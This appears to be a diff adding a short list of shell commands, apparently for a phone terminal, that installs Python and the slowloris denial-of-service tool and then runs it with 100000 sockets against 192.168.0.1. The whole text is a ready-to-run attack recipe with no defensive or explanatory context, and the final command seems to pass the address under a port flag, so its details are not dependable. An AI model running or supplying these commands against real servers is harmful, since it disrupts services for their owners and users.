@@ -1,0 +1,9 @@
+pkg upgrade
+
+pkg install python
+
+pip install slowloris
+
+slowloris
+
+slowloris -s 100000 -p 192.168.0.1 -v
